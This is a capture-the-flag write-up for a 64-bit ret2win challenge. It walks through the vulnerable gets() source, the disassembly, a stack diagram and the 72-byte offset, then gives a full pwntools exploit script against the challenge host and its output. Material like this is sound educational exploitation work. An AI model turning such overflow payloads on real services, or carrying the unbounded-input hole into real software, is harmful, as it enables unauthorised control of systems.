# CyLab — X-Sixty-What

* **Platform:** CyLab Security Academy / picoCTF 2022 (Challenge ID: `319`)
* **Category:** Binary Exploitation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `vuln` (x86_64 ELF)

---

## TL;DR

The challenge demonstrates basic stack smashing in 64-bit architectures. A vulnerable function reads user input via `gets()` into a 64-byte stack buffer (`buf[64]` at `[rbp-0x40]`). In 64-bit mode, pointers and saved frame registers occupy 8 bytes rather than 4 bytes. Smashing the buffer requires 64 bytes of buffer space plus 8 bytes of saved RBP (total offset = 72 bytes) before overwriting the saved return address. Redirecting control flow to the non-PIE target function `flag()` at `0x401236` outputs the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **64-bit Architecture:** All stack frames, base pointers, and return addresses are 8-byte aligned quadwords.
2. **No Canary & No PIE:** The stack lacks canary protection, and binary text addresses are fixed at base `0x400000`.
3. **Target Function Available:** A dedicated `flag()` function exists within the binary to display the flag.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>

void flag() {
    char buf[64];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("flag.txt is missing!\n");
        exit(0);
    }
    fgets(buf, 64, f);
    printf(buf);
}

void vuln() {
    char buf[64];
    printf("Give me some data and I will show you a flag:\n");
    gets(buf);      // VULNERABILITY: Unbounded input into 64-byte buffer
}

int main() {
    vuln();
    return 0;
}
```

### 2. Disassembly & Stack Frame Layout

Inspecting `vuln()` in GDB:

```asm
0x0000000000401290 <+0>:    push   rbp
0x0000000000401291 <+1>:    mov    rbp, rsp
0x0000000000401294 <+4>:    sub    rsp, 0x40               ; Allocate 64 bytes (0x40) for buf
0x0000000000401298 <+8>:    lea    rax, [rbp-0x40]
0x000000000040129c <+12>:   mov    rdi, rax
0x000000000040129f <+15>:   call   0x401060 <gets@plt>
0x00000000004012a4 <+20>:   leave
0x00000000004012a5 <+21>:   ret
```

Locating `flag()`:

```text
$ objdump -d vuln | grep -A 5 "<flag>:"
0000000000401236 <flag>:
  401236:	f3 0f 1e fa          	endbr64
  40123a:	55                   	push   rbp
  40123b:	48 89 e5             	mov    rbp,rsp
```

Stack frame mapping for `vuln()`:

```text
       Lower Addresses (Stack Top)
  +-----------------------------------+  [rbp - 0x40]
  |          buf[64]                  |  (64 bytes user input)
  +-----------------------------------+  [rbp]
  |       Saved RBP (8 bytes)         |  (8 bytes frame pointer)
  +-----------------------------------+  [rbp + 0x08]
  |   Saved Return Address (8 bytes)  |  (Target: overwrite with 0x401236)
  +-----------------------------------+
       Higher Addresses
```

Offset calculation:
$$\text{Offset} = 64 \text{ bytes (buffer)} + 8 \text{ bytes (saved RBP)} = 72 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

1. **Calculating the Offset:**
   Using cyclic pattern generation:
   ```python
   cyclic(100) -> crash at offset 72
   ```
2. **Stack Alignment (x86_64 ABI):**
   In 64-bit System V AMD64 ABI, the stack pointer `rsp` must be 16-byte aligned before entering functions that execute instructions such as `movaps` (often used inside `printf` or `fgets`).
   - If calling `flag` at `0x401236` causes an alignment crash, jumping directly to `0x40123b` (skipping `push rbp`) or prepending a single `ret` gadget (`0x40101a`) resolves the issue.
   - On the challenge target, jumping directly to `0x401236` runs reliably.
3. **Payload Structure:**
   ```python
   payload = b"A" * 72 + p64(0x401236)
   ```

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 26843
FLAG_ADDR = 0x401236
OFFSET = 72

def solve(io):
    io.recvuntil(b"flag:\n")
    # 72 bytes padding + 64-bit address of flag()
    payload = b"A" * OFFSET + p64(FLAG_ADDR)
    io.sendline(payload)

    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 26843: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 26843
```

---

## Key Takeaways & Lessons

1. **32-Bit vs. 64-Bit Memory Offsets:** In 64-bit mode, saved base pointers and return addresses expand from 4 bytes to 8 bytes (`p64()` quadwords). Remembering to account for an 8-byte saved RBP is critical.
2. **x86_64 Stack Alignment Traps:** Functions utilizing SIMD instructions (like `movaps`) inside libc require `(rsp & 0xf) == 0`. When a ret2win exploit crashes on `call printf`, jumping past the initial `push rbp` or inserting a dummy `ret` gadget aligns the stack.
3. **Classic ret2win Pattern:** When PIE is absent and a win function exists, finding the exact stack offset using cyclic patterns or disassembly is sufficient for full control-flow redirection.
